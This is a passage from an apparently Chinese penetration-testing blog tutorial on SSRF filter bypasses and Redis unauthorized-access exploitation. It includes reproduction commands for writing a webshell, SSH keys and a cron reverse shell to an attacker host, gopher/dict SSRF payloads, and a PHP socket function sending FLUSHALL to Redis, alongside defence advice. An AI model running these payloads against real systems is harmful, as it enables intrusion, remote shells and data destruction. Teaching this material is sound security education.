class="line">Random base:</span><br><span class="line"><span class="comment">#1:     0xc0.0250.0x64.0x1</span></span><br><span class="line"><span class="comment">#2:     192.0250.100.01</span></span><br><span class="line"><span class="comment">#3:     192.0xa8.100.0x1</span></span><br><span class="line"><span class="comment">#4:     192.0xa8.100.1</span></span><br><span class="line"><span class="comment">#5:     0300.0xa8.0144.01</span></span><br><span class="line"></span><br><span class="line">Random base with random padding:</span><br><span class="line"><span class="comment">#1:     192.168.100.0000000000000001</span></span><br><span class="line"><span class="comment">#2:     0x00000000000000000000000c0.168.0x00000000000000064.00000000000001</span></span><br><span class="line"><span class="comment">#3:     000000000300.168.0x000000000000000064.0000000000000001</span></span><br><span class="line"><span class="comment">#4:     0x00000000000000000c0.00000000000000000000000000250.0000000000000000000000144.0000000001</span></span><br><span class="line"><span class="comment">#5:     00000000300.0x000000000000000000000000000000a8.0x000000000000000000000064.0000000000000000000000001</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://hongkong-img.oss-cn-hongkong.aliyuncs.com/markdown-img/image-20250408230230486.png?x-oss-process=style/img-to-webp" alt="image-20250408230230486"></p>
<h5 id="2-本地回环简写绕过"><a href="#2-本地回环简写绕过" class="headerlink" title="2.本地回环简写绕过"></a><strong>2.本地回环简写绕过</strong></h5><p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://hongkong-img.oss-cn-hongkong.aliyuncs.com/markdown-img/image-20250408230429346.png?x-oss-process=style/img-to-webp" alt="image-20250408230429346"></p>
<h5 id="3-域名泛解析绕过"><a href="#3-域名泛解析绕过" class="headerlink" title="3.域名泛解析绕过"></a>3.域名泛解析绕过</h5><ul>
<li>例如当<code>www.xxx.com</code>存在域名泛解析的配置，当我们直接ssrf请求这个地址被过滤，那我们可以使用泛域名解析任意前缀<code>abc.xxx.com</code>-&gt;<code>www.xxx.com</code>这样就会执行到<code>www.xxx.com</code></li>
</ul>
<h5 id="4-利用句号代替“-”绕过"><a href="#4-利用句号代替“-”绕过" class="headerlink" title="4.利用句号代替“.”绕过"></a>4.利用句号代替“.”绕过</h5><ul>
<li>ping 192。168。100。1</li>
</ul>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://hongkong-img.oss-cn-hongkong.aliyuncs.com/markdown-img/image-20250408230935436.png?x-oss-process=style/img-to-webp" alt="image-20250408230935436"></p>
<h5 id="5-短链接绕过"><a href="#5-短链接绕过" class="headerlink" title="5.短链接绕过"></a>5.短链接绕过</h5><ul>
<li>利用短链接生成网站，生成短链接，其实本质就是域名地址重定向，将生成的短链接地址指向我们想要访问的地址。</li>
</ul>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://hongkong-img.oss-cn-hongkong.aliyuncs.com/markdown-img/image-20250408231321760.png?x-oss-process=style/img-to-webp" alt="image-20250408231321760"></p>
<h5 id="6-注释绕过-路由绕过"><a href="#6-注释绕过-路由绕过" class="headerlink" title="6.注释绕过&#x2F;路由绕过"></a>6.注释绕过&#x2F;路由绕过</h5><ul>
<li>curl <a target="_blank" rel="noopener" href="http://192.168.100.1/#@test.com">http://192.168.100.1#@test.com</a></li>
<li>可用于白名单绕过</li>
</ul>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://hongkong-img.oss-cn-hongkong.aliyuncs.com/markdown-img/image-20250408231711020.png?x-oss-process=style/img-to-webp" alt="image-20250408231711020"></p>
<h5 id="7-利用封闭的字母数字绕过"><a href="#7-利用封闭的字母数字绕过" class="headerlink" title="7.利用封闭的字母数字绕过"></a>7.利用封闭的字母数字绕过</h5><ul>
<li>curl ①⑨②。①⑥⑧。①00。①</li>
</ul>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">┌──(kali㉿kali)-[~/Desktop/attackTools]</span><br><span class="line">└─$ curl http://①⑨②。①⑥⑧。①00。①       </span><br><span class="line">&lt;!DOCTYPE HTML&gt;</span><br><span class="line">&lt;html lang=&quot;en&quot;&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">&lt;meta charset=&quot;utf-8&quot;&gt;</span><br><span class="line">&lt;title&gt;Directory listing for /&lt;/title&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">&lt;h1&gt;Directory listing for /&lt;/h1&gt;</span><br><span class="line">&lt;hr&gt;</span><br><span class="line">&lt;ul&gt;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://hongkong-img.oss-cn-hongkong.aliyuncs.com/markdown-img/image-20250408232200398.png?x-oss-process=style/img-to-webp" alt="image-20250408232200398"></p>
<h5 id="8-利用ipv6解析绕过"><a href="#8-利用ipv6解析绕过" class="headerlink" title="8.[::]利用ipv6解析绕过"></a>8.[::]利用ipv6解析绕过</h5><h5 id="9-CRLF编码转换绕过"><a href="#9-CRLF编码转换绕过" class="headerlink" title="9.CRLF编码转换绕过"></a>9.CRLF编码转换绕过</h5><ul>
<li>在请求数据包阶段可用</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">%0d -&gt; 0x0d -&gt; \r </span><br><span class="line">%0a -&gt; 0x0a -&gt; \n </span><br></pre></td></tr></table></figure>

<ul>
<li><code>example.com/?url=http://eval.com%0d%0aHOST:FUZZ.COM%0d%0a</code></li>
</ul>
<h5 id="10-域名指向绕过"><a href="#10-域名指向绕过" class="headerlink" title="10.域名指向绕过"></a>10.域名指向绕过</h5><ul>
<li>域名指向本地回环地址，当服务端解析了这个域名后请求的是本地回环地址。</li>
<li>xxx.com -&gt; 127.0.0.1</li>
</ul>
<h5 id="11-重定向绕过"><a href="#11-重定向绕过" class="headerlink" title="11.重定向绕过"></a>11.重定向绕过</h5><ul>
<li>curl  <a target="_blank" rel="noopener" href="http://192.168.100.1@127.0.0.1:81/">http://192.168.100.1@127.0.0.1:81</a></li>
<li>这样实际上请求的就是127.0.0.1:81这个端口</li>
<li>利用条件是当且仅当第一段url没有后面的链接例如<code>curl http://192.168.100.1/useruid.ini@127.0.0.1:81</code>，是无法从定向的实际还是请求的是192.168.100.1:80的服务，后面url是&#x2F;<a href="mailto:&#117;&#115;&#101;&#114;&#x75;&#105;&#100;&#46;&#x69;&#110;&#x69;&#x40;&#x31;&#x32;&#55;&#46;&#48;&#46;&#x30;&#x2e;&#49;">&#117;&#115;&#101;&#114;&#x75;&#105;&#100;&#46;&#x69;&#110;&#x69;&#x40;&#x31;&#x32;&#55;&#46;&#48;&#46;&#x30;&#x2e;&#49;</a>:81。</li>
</ul>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://hongkong-img.oss-cn-hongkong.aliyuncs.com/markdown-img/image-20250408233427807.png?x-oss-process=style/img-to-webp" alt="image-20250408233427807"></p>
<hr>
<h3 id="五、攻击步骤"><a href="#五、攻击步骤" class="headerlink" title="五、攻击步骤"></a>五、攻击步骤</h3><ol>
<li>验证是否能狗对外发起指定请求，利用dnslog验证。</li>
<li>验证当前支持哪些协议，http、dict、gopher、file</li>
<li>验证是否支持回环地址</li>
<li>内网段ip探测</li>
<li>探测具体服务 ，例如mysql 或者 redis</li>
<li>发起恶意攻击 （getshell）</li>
</ol>
<h3 id="六、SSRF-漏洞防御方案"><a href="#六、SSRF-漏洞防御方案" class="headerlink" title="六、SSRF 漏洞防御方案"></a>六、SSRF 漏洞防御方案</h3><h4 id="1-输入校验与过滤"><a href="#1-输入校验与过滤" class="headerlink" title="1. 输入校验与过滤"></a>1. 输入校验与过滤</h4><ul>
<li><strong>白名单校验</strong><br>限制允许的协议（仅 <code>HTTP/HTTPS</code>）和域名&#x2F;IP。</li>
<li><strong>禁用危险协议</strong><br>禁止 <code>file://</code>、<code>gopher://</code>、<code>dict://</code> 等协议。</li>
<li><strong>正则匹配</strong><br>检查 URL 是否包含内网 IP（如 <code>127.0.0.1</code>、<code>192.168.0.0/16</code>）。</li>
</ul>
<h4 id="2-网络隔离与权限控制"><a href="#2-网络隔离与权限控制" class="headerlink" title="2. 网络隔离与权限控制"></a>2. 网络隔离与权限控制</h4><ul>
<li><strong>服务器网络隔离</strong><br>禁止服务器访问非必要的内网服务。</li>
<li><strong>最小化权限</strong><br>运行服务的进程使用低权限用户，限制文件读取能力。</li>
</ul>
<h4 id="3-安全编码实践"><a href="#3-安全编码实践" class="headerlink" title="3. 安全编码实践"></a>3. 安全编码实践</h4><ul>
<li><strong>避免直接使用用户输入</strong><br>使用中间代理或缓存服务器处理外部资源。</li>
<li><strong>使用安全库</strong><br>如 Python 的 <code>requests</code> 库代替 <code>urllib</code>，避免自动处理协议。</li>
</ul>
<h4 id="4-云环境防护"><a href="#4-云环境防护" class="headerlink" title="4. 云环境防护"></a>4. 云环境防护</h4><ul>
<li><strong>限制元数据接口访问</strong><br>通过云安全组或 IAM 策略限制对元数据接口的访问。</li>
<li><strong>使用临时凭证</strong><br>避免在元数据中存储长期有效的密钥。</li>
</ul>
<h4 id="5-监控与日志"><a href="#5-监控与日志" class="headerlink" title="5. 监控与日志"></a>5. 监控与日志</h4><ul>
<li><strong>记录异常请求</strong><br>监控服务器发起的非预期请求（如访问 <code>127.0.0.1</code> 或云元数据）。</li>
<li><strong>部署 WAF</strong><br>使用 Web 应用防火墙拦截 SSRF 攻击特征。</li>
</ul>
<hr>
<h3 id="七、经典案例"><a href="#七、经典案例" class="headerlink" title="七、经典案例"></a>七、经典案例</h3><ol>
<li><p><strong>Redis 未授权访问 + SSRF</strong>  </p>
<ul>
<li>利用 <code>gopher://</code> 协议发送 Redis 命令，写入定时任务反弹 Shell。</li>
<li>防御：禁用非 HTTP 协议，限制 Redis 绑定 IP。</li>
</ul>
</li>
<li><p><strong>WordPress 图片抓取 SSRF</strong>  </p>
<ul>
<li>通过媒体上传功能触发 SSRF，访问内网服务。</li>
<li>防御：校验图片 URL 白名单。</li>
</ul>
</li>
<li><p><strong>XXE + SSRF</strong>  </p>
<ul>
<li>通过 XML 外部实体注入触发 SSRF，读取服务器文件。</li>
<li>防御：禁用 XML 外部实体解析。</li>
</ul>
</li>
</ol>
<hr>
<h3 id="八、工具与检测"><a href="#八、工具与检测" class="headerlink" title="八、工具与检测"></a>八、工具与检测</h3><ol>
<li><strong>测试工具</strong>  <ul>
<li>Burp Suite（Collaborator 检测 SSRF）。</li>
<li>SSRFmap（自动化漏洞利用工具）。</li>
</ul>
</li>
<li><strong>在线检测</strong>  <ul>
<li>请求 <code>http://169.254.169.254</code> 测试云元数据暴露。</li>
<li>使用 DNSLog 平台观察服务器是否发起 DNS 查询。</li>
</ul>
</li>
</ol>
<hr>
<h3 id="九、总结"><a href="#九、总结" class="headerlink" title="九、总结"></a>九、总结</h3><p>SSRF 是服务器安全的高危漏洞，可穿透内网边界，结合其他服务（如 Redis、云元数据）造成严重危害。防御核心在于 <strong>严格校验输入、限制网络权限、最小化服务暴露</strong>。开发中需始终遵循“不信任用户输入”原则，结合安全配置和监控降低风险。</p>
<h2 id="Redis-未授权访问漏洞详解"><a href="#Redis-未授权访问漏洞详解" class="headerlink" title="Redis 未授权访问漏洞详解"></a>Redis 未授权访问漏洞详解</h2><p><strong>CNVD-2015-07557</strong> 是 Redis 数据库中的一个严重未授权访问漏洞，攻击者可以通过未授权访问 Redis 服务，利用 Redis 的文件写入功能实现远程代码执行（RCE）或获取服务器权限。以下是该漏洞的详细解析，包括漏洞原理、利用条件、影响版本及复现步骤。</p>
<hr>
<h3 id="1-漏洞背景"><a href="#1-漏洞背景" class="headerlink" title="1. 漏洞背景"></a>1. 漏洞背景</h3><p>Redis 是一个开源的高性能键值存储数据库，广泛应用于缓存、消息队列等场景。由于 Redis 默认配置下未启用身份验证，攻击者可以直接连接到 Redis 服务并执行任意操作，导致未授权访问漏洞的产生。</p>
<hr>
<h3 id="2-漏洞原理"><a href="#2-漏洞原理" class="headerlink" title="2. 漏洞原理"></a>2. 漏洞原理</h3><p>漏洞的核心在于 Redis 的 <strong>未授权访问</strong> 和 <strong>文件写入功能</strong>：</p>
<ol>
<li><p><strong>未授权访问</strong>：</p>
<ul>
<li>Redis 默认绑定在 <code>0.0.0.0:6379</code>，且未启用密码认证，导致攻击者可以直接连接并操作 Redis 数据库。</li>
</ul>
</li>
<li><p><strong>文件写入功能</strong>：</p>
<ul>
<li>Redis 提供了 <code>config set dir</code> 和 <code>config set dbfilename</code> 命令，允许用户设置数据库文件的存储路径和文件名。</li>
<li>攻击者可以通过这些命令将恶意数据写入目标服务器的文件系统，例如写入 WebShell、SSH 公钥或定时任务，从而实现远程代码执行或提权。</li>
</ul>
</li>
<li><p><strong>利用方式</strong>：</p>
<ul>
<li><strong>写入 WebShell</strong>：将恶意代码写入 Web 目录，通过访问 WebShell 执行命令。</li>
<li><strong>写入 SSH 公钥</strong>：将攻击者的公钥写入目标服务器的 <code>authorized_keys</code> 文件，实现免密登录。</li>
<li><strong>写入定时任务</strong>：将恶意命令写入定时任务文件，实现命令执行。</li>
</ul>
</li>
</ol>
<hr>
<h3 id="3-影响版本"><a href="#3-影响版本" class="headerlink" title="3. 影响版本"></a>3. 影响版本</h3><ul>
<li><strong>受影响版本</strong>：<ul>
<li>Redis &lt;&#x3D; 5.0.5。</li>
</ul>
</li>
<li><strong>修复版本</strong>：<ul>
<li>Redis 5.0.5 及以上版本已修复该漏洞。</li>
</ul>
</li>
</ul>
<hr>
<h3 id="4-漏洞利用条件"><a href="#4-漏洞利用条件" class="headerlink" title="4. 漏洞利用条件"></a>4. 漏洞利用条件</h3><ol>
<li><p><strong>目标系统</strong>：</p>
<ul>
<li>运行受影响版本的 Redis。</li>
<li>Redis 服务未启用密码认证。</li>
<li>Redis 绑定在 <code>0.0.0.0</code> 或暴露在公网。</li>
</ul>
</li>
<li><p><strong>攻击者权限</strong>：</p>
<ul>
<li>攻击者能够访问目标 Redis 服务的端口（默认 6379）。</li>
</ul>
</li>
<li><p><strong>文件写入条件</strong>：</p>
<ul>
<li><strong>写入 WebShell</strong>：需要知道 Web 目录路径并具有写权限。</li>
<li><strong>写入 SSH 公钥</strong>：需要 Redis 以 root 权限运行，且目标服务器允许 SSH 密钥登录。</li>
<li><strong>写入定时任务</strong>：需要 Redis 以 root 权限运行，且目标系统支持定时任务执行。</li>
</ul>
</li>
</ol>
<hr>
<h3 id="5-漏洞复现"><a href="#5-漏洞复现" class="headerlink" title="5. 漏洞复现"></a>5. 漏洞复现</h3><p>以下是漏洞复现的简要步骤：</p>
<h4 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h4><ol>
<li>使用 Docker 或虚拟机搭建 Redis 环境（如 Redis 4.0.10）。</li>
<li>确保 Redis 未启用密码认证，并绑定在 <code>0.0.0.0</code>。</li>
</ol>
<h4 id="写入-WebShell"><a href="#写入-WebShell" class="headerlink" title="写入 WebShell"></a>写入 WebShell</h4><ol>
<li><p>使用 Redis 客户端连接目标 Redis 服务：</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">redis-cli -h 目标IP</span><br></pre></td></tr></table></figure>
</li>
<li><p>设置 Web 目录和文件名：</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">config <span class="built_in">set</span> <span class="built_in">dir</span> /var/www/html</span><br><span class="line">config <span class="built_in">set</span> dbfilename shell.php</span><br></pre></td></tr></table></figure>
</li>
<li><p>写入恶意代码：</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">set</span> <span class="built_in">test</span> <span class="string">&quot;&lt;?php phpinfo(); ?&gt;&quot;</span></span><br><span class="line">save</span><br></pre></td></tr></table></figure>
</li>
<li><p>访问 WebShell：</p>
<ul>
<li>在浏览器中访问 <code>http://目标IP/shell.php</code>，查看是否成功写入。</li>
</ul>
</li>
</ol>
<h4 id="写入-SSH-公钥"><a href="#写入-SSH-公钥" class="headerlink" title="写入 SSH 公钥"></a>写入 SSH 公钥</h4><ol>
<li><p>在攻击机上生成 SSH 密钥：</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ssh-keygen -t rsa</span><br></pre></td></tr></table></figure>
</li>
<li><p>将公钥写入 Redis：</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">(<span class="built_in">echo</span> -e <span class="string">&quot;\n\n&quot;</span>; <span class="built_in">cat</span> ~/.ssh/id_rsa.pub; <span class="built_in">echo</span> -e <span class="string">&quot;\n\n&quot;</span>) &gt; key.txt</span><br><span class="line"><span class="built_in">cat</span> key.txt | redis-cli -h 目标IP -x <span class="built_in">set</span> xxx</span><br></pre></td></tr></table></figure>
</li>
<li><p>设置 Redis 文件路径：</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">config <span class="built_in">set</span> <span class="built_in">dir</span> /root/.ssh</span><br><span class="line">config <span class="built_in">set</span> dbfilename authorized_keys</span><br><span class="line">save</span><br></pre></td></tr></table></figure>
</li>
<li><p>使用 SSH 登录目标服务器：</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ssh -i ~/.ssh/id_rsa root@目标IP</span><br></pre></td></tr></table></figure></li>
</ol>
<h4 id="写入定时任务"><a href="#写入定时任务" class="headerlink" title="写入定时任务"></a>写入定时任务</h4><ol>
<li><p>设置定时任务目录：</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">config <span class="built_in">set</span> <span class="built_in">dir</span> /var/spool/cron <span class="comment"># /var/spool/cron/crontabs</span></span><br><span class="line">config <span class="built_in">set</span> dbfilename root</span><br></pre></td></tr></table></figure>
</li>
<li><p>写入反弹 Shell 命令：</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">set</span> yy <span class="string">&quot;\n\n* * * * * bash -i &gt;&amp; /dev/tcp/攻击机IP/5555 0&gt;&amp;1\n\n&quot;</span></span><br><span class="line">save</span><br></pre></td></tr></table></figure>
</li>
<li><p>在攻击机上监听端口：</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nc -lvp 5555</span><br></pre></td></tr></table></figure>
</li>
<li><p>等待定时任务执行，获取反弹 Shell。</p>
</li>
</ol>
<h4 id="可能会出现各种问题："><a href="#可能会出现各种问题：" class="headerlink" title="可能会出现各种问题："></a>可能会出现各种问题：</h4><ol>
<li><p>各个版本的linux发行版或者新旧版本，定时任务目录不同。</p>
</li>
<li><p>写入的文件没有执行权限，或者目录没有写入权限。</p>
</li>
<li><p>或者目标服务器根本没有使用过公私钥方式进行登陆，因此不存在.ssh文件夹。</p>
</li>
<li><p>写文件时还得尽量保证redis的键值对清空，否则写入执行不了，或者链接不上。</p>
</li>
<li><p>redis 不支持”~”字符，仅支持绝对路径，而root目录，大概率权限又不够，因此不知道用户名的情况下，很难写入公钥文件。</p>
</li>
<li><p>反正就是成功率很低。</p>
</li>
</ol>
<hr>
<h3 id="6-修复建议"><a href="#6-修复建议" class="headerlink" title="6. 修复建议"></a>6. 修复建议</h3><ol>
<li><p><strong>启用密码认证</strong>：</p>
<ul>
<li>在 <code>redis.conf</code> 中设置 <code>requirepass</code> 参数，启用密码认证。</li>
</ul>
</li>
<li><p><strong>绑定 IP</strong>：</p>
<ul>
<li>修改 <code>redis.conf</code> 中的 <code>bind</code> 参数，限制 Redis 仅监听本地或可信 IP。</li>
</ul>
</li>
<li><p><strong>禁用高危命令</strong>：</p>
<ul>
<li>使用 <code>rename-command</code> 禁用 <code>config</code>、<code>save</code> 等危险命令。</li>
</ul>
</li>
<li><p><strong>防火墙策略</strong>：</p>
<ul>
<li>使用防火墙限制 Redis 端口的访问范围，仅允许可信 IP 访问。</li>
</ul>
</li>
</ol>
<hr>
<h3 id="7-总结"><a href="#7-总结" class="headerlink" title="7. 总结"></a>7. 总结</h3><p>CNVD-2015-07557 是一个高危的未授权访问漏洞，影响范围广泛，利用条件简单。建议用户尽快启用密码认证、限制访问权限，并升级到最新版本，以避免潜在的安全风险。通过禁用不必要的功能和实施安全策略，可以有效降低漏洞被利用的风险。</p>
<p>说实话不好成功，唯一还算可以成功的的就是redis写webshell，redis只让127.0.0.1访问，使用ssrf gophar协议，进行文件写入，实现远程RCE。</p>
<h1 id="SSRF结合Redis利用"><a href="#SSRF结合Redis利用" class="headerlink" title="SSRF结合Redis利用"></a>SSRF结合Redis利用</h1><p>利用SSRF（服务器端请求伪造）结合Redis未授权漏洞进行内网渗透的攻击流程可分为以下几个阶段：</p>
<hr>
<h3 id="1-漏洞探测阶段"><a href="#1-漏洞探测阶段" class="headerlink" title="1. 漏洞探测阶段"></a><strong>1. 漏洞探测阶段</strong></h3><h4 id="1-1-确认SSRF漏洞存在"><a href="#1-1-确认SSRF漏洞存在" class="headerlink" title="1.1 确认SSRF漏洞存在"></a><strong>1.1 确认SSRF漏洞存在</strong></h4><ul>
<li><strong>目标场景</strong>：找到存在SSRF漏洞的功能点（如URL参数、文件解析、Webhook回调等）。</li>
<li><strong>验证方法</strong>：<figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">GET</span> <span class="string">/api/fetch?url=http://attacker-controlled.com</span> <span class="meta">HTTP/1.1</span></span><br></pre></td></tr></table></figure>
若服务器请求了攻击者控制的地址，则存在SSRF。</li>
</ul>
<h4 id="1-2-探测内网Redis服务"><a href="#1-2-探测内网Redis服务" class="headerlink" title="1.2 探测内网Redis服务"></a><strong>1.2 探测内网Redis服务</strong></h4><ul>
<li><strong>目标</strong>：通过SSRF扫描内网IP和端口，寻找开放的Redis服务（默认端口6379）。</li>
<li><strong>Payload示例</strong>（基于HTTP协议）：<figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">GET</span> <span class="string">/api/fetch?url=dict://192.168.1.10:6379/info</span> <span class="meta">HTTP/1.1</span></span><br></pre></td></tr></table></figure>
<ul>
<li>若返回Redis版本信息（如<code>redis_version</code>），则存在未授权访问。</li>
</ul>
</li>
</ul>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://hongkong-img.oss-cn-hongkong.aliyuncs.com/markdown-img/image-20250323015130425.png?x-oss-process=style/img-to-webp" alt="image-20250323015130425"></p>
<hr>
<h3 id="2-利用Redis未授权漏洞"><a href="#2-利用Redis未授权漏洞" class="headerlink" title="2. 利用Redis未授权漏洞"></a><strong>2. 利用Redis未授权漏洞</strong></h3><h4 id="2-1-PHP-内置-Gopher-协议支持的版本差异"><a href="#2-1-PHP-内置-Gopher-协议支持的版本差异" class="headerlink" title="2.1 PHP 内置 Gopher 协议支持的版本差异"></a>2.1 <strong>PHP 内置 Gopher 协议支持的版本差异</strong></h4><ul>
<li><strong>PHP &lt; 5.3</strong>：原生支持 <code>gopher://</code> 协议处理器（如 <code>file_get_contents(&#39;gopher://...&#39;)</code>）</li>
<li><strong>PHP ≥ 5.3</strong>：<strong>移除了 Gopher 协议支持</strong>，直接使用 <code>gopher://</code> 会报错，但通过 <code>fsockopen</code> 手动构造 TCP 请求仍有效。</li>
</ul>
<table>
<thead>
<tr>
<th align="left">PHP 版本</th>
<th align="left">影响点</th>
<th align="left">解决方案</th>
</tr>
</thead>
<tbody><tr>
<td align="left"><strong>PHP ≥ 5.3</strong></td>
<td align="left">禁用内置 Gopher 协议</td>
<td align="left">使用 <code>fsockopen</code> 手动构造请求</td>
</tr>
<tr>
<td align="left"><strong>PHP ≥ 7.0</strong></td>
<td align="left">更严格的错误处理机制</td>
<td align="left">确保命令格式完全符合 RESP 协议</td>
</tr>
<tr>
<td align="left"><strong>全版本</strong></td>
<td align="left"><code>disable_functions</code> 限制</td>
<td align="left">检查是否禁用网络相关函数</td>
</tr>
</tbody></table>
<ul>
<li><h4 id="攻击代码的版本兼容性"><a href="#攻击代码的版本兼容性" class="headerlink" title="攻击代码的版本兼容性"></a><strong>攻击代码的版本兼容性</strong></h4><p>以下代码在所有 PHP 版本中均可运行（需 <code>fsockopen</code> 未被禁用）：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">attackRedis</span>(<span class="params"><span class="variable">$host</span>, <span class="variable">$port</span>, <span class="variable">$payload</span></span>) </span>&#123;</span><br><span class="line">    <span class="variable">$socket</span> = <span class="title function_ invoke__">fsockopen</span>(<span class="variable">$host</span>, <span class="variable">$port</span>, <span class="variable">$errno</span>, <span class="variable">$errstr</span>, <span class="number">3</span>);</span><br><span class="line">    <span class="keyword">if</span> (!<span class="variable">$socket</span>) <span class="keyword">die</span>(<span class="string">&quot;连接失败: <span class="subst">$errstr</span>&quot;</span>);</span><br><span class="line">    <span class="title function_ invoke__">fwrite</span>(<span class="variable">$socket</span>, <span class="variable">$payload</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="title function_ invoke__">stream_get_contents</span>(<span class="variable">$socket</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 示例：发送 FLUSHALL 命令</span></span><br><span class="line"><span class="variable">$payload</span> = <span class="string">&quot;*1\r\n\$8\r\nFLUSHALL\r\n&quot;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">attackRedis</span>(<span class="string">&#x27;192.168.1.100&#x27;</span>, <span class="number">6379</span>, <span class="variable">$payload</span>);</span><br></pre></td></tr></table></figure></li>
</ul>
<h4 id="2-2-利用Gopher协议构造Redis命令"><a href="#2-2-利用Gopher协议构造Redis命令" class="headerlink" title="2.2 利用Gopher协议构造Redis命令"></a><strong>2.2 利用Gopher协议构造Redis命令</strong></h4><p>Redis使用自定义二进制协议，需通过支持原始TCP的协议（如<code>gopher</code>）发送命令。</p>
<ul>
<li><p><strong>Gopher协议格式</strong>：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gopher://&lt;目标IP&gt;:&lt;端口&gt;/_&lt;经过URL编码的Redis命令&gt;</span><br></pre></td></tr></table></figure></li>
<li><p><strong>关键步骤</strong>：</p>
<ol>
<li><strong>构造Redis命令</strong>（示例：写入SSH公钥）。</li>
<li><strong>将命令转换为Redis协议格式</strong>。</li>
<li><strong>URL编码后通过SSRF发送</strong>。</li>
</ol>
</li>
</ul>
<h4 id="2-3-生成Redis协议Payload"><a href="#2-3-生成Redis协议Payload" class="headerlink" title="2.3 生成Redis协议Payload"></a><strong>2.3 生成Redis协议Payload</strong></h4><p>以写入SSH公钥为例：</p>
